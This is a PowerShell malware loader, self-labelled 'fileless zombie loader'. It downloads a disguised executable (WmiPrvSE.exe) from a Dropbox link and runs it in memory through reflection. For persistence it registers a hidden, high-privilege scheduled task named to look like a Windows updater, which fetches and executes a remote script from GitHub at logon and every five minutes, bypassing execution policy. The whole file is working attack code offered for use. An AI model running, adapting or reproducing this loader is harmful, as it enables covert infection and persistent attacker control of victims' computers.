# ==========================================
# FILELESS ZOMBIE LOADER (DEBUG MODE)
# ==========================================

$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$LoaderUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$TaskName   = "MicrosoftWindowsUpdater"

Write-Host "🔍 [DEBUG] Starting Loader..." -ForegroundColor Cyan

# 1. FILELESS EXECUTION
function Run-Fileless {
    Write-Host "   [STEP 1] Attempting Fileless Execution (RAM Only)..." -ForegroundColor Yellow
    try {
        $wc = New-Object System.Net.WebClient
        $bytes = $wc.DownloadData($PayloadUrl)
        Write-Host "      + Payload Downloaded ($(("{0:N2}" -f ($bytes.Length/1MB))) MB)" -ForegroundColor Gray
        
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Write-Host "      + Assembly Loaded into Memory." -ForegroundColor Gray
        
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            Write-Host "      + Invoking EntryPoint..." -ForegroundColor Green
            $entryPoint.Invoke($null, $null)
            Write-Host "      ✅ SUCCESS: Payload Running in RAM." -ForegroundColor Green
        } else {
             Write-Host "      ❌ ERROR: No EntryPoint found in EXE." -ForegroundColor Red
        }
    } catch {
        Write-Host "      ❌ FAILED: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# 2. PERSISTENCE CHECK
$TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($TaskExists) {
    Write-Host "   [STEP 2] Persistence Task '$TaskName' ALREADY EXISTS." -ForegroundColor Green
} else {
    Write-Host "   [STEP 2] Installing Persistence Task '$TaskName'..." -ForegroundColor Yellow
    try {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$LoaderUrl' | iex`""
        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
        Write-Host "      ✅ SUCCESS: Task Created (Runs at Logon + Every 5 Mins)." -ForegroundColor Green
    } catch {
        Write-Host "      ❌ FAILED to Create Task: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# 3. EXECUTE
Run-Fileless
Write-Host "🔍 [DEBUG] Script Finished." -ForegroundColor Cyan
